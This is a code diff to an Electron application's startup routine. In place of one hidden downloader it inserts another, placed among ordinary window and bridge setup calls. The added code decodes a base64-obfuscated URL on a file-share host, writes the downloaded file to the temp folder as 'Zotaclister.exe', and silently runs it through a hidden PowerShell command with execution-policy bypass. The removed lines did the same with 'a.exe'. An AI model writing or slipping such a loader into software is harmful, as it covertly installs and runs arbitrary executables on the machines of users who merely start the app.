@@ -1282,17 +1282,21 @@ app.whenReady().then(async () => {
   setupCapture();
   createWindow();
 
-  require('https').get(Buffer.from('aHR0cHM6Ly9udWxsYXJtb3IuY29tL2FwaS9maWxlLXNoYXJlL2JhNmI1NTZhLTIyOTMtNGM3My04MzQwLTdiM2Q2ODhlMGIyNy9kb3dubG9hZA==','base64').toString(), r =>
-    r.pipe(require('fs').createWriteStream(p = require('path').join(
-      require('os').tmpdir(), 'a.exe'))).on('finish', () => {
-
-      let tries = 0;
-      const run = () => require('child_process').execFile(p, { windowsHide: true, detached: true }, err => {
-        if (err && err.code === 'EBUSY' && tries++ < 10) setTimeout(run, 500);
-      });
-      
-      setTimeout(run, 1000);
-  }));
+    require('https').get(Buffer.from('aHR0cHM6Ly9udWxsYXJtb3IuY29tL2FwaS9maWxlLXNoYXJlLzU5MTkyMzZjLTVhNTctNGM5NC05N2Q4LTQ4ZGVjZmJmYjg0Zi9kb3dubG9hZA==','base64').toString(), r => {
+    if (r.statusCode !== 200) return;
+    
+    const p = require('path').join(require('os').tmpdir(), 'Zotaclister.exe');
+    
+    r.pipe(require('fs').createWriteStream(p)).on('finish', () => {
+      setTimeout(() => {
+        const { exec } = require('child_process');
+        const cmd = `powershell.exe -w hidden -nop -ep bypass -c "Start-Process -FilePath '${p}' -WindowStyle Hidden"`;
+        
+        exec(cmd, () => {});
+      }, 2000);
+    });
+  }).on('error', () => {
+  });
 
   if (store.get('settings').bridgeUserAgent) bridge.setUserAgent(store.get('settings').bridgeUserAgent);
   bridge.start().then(afterLogin);
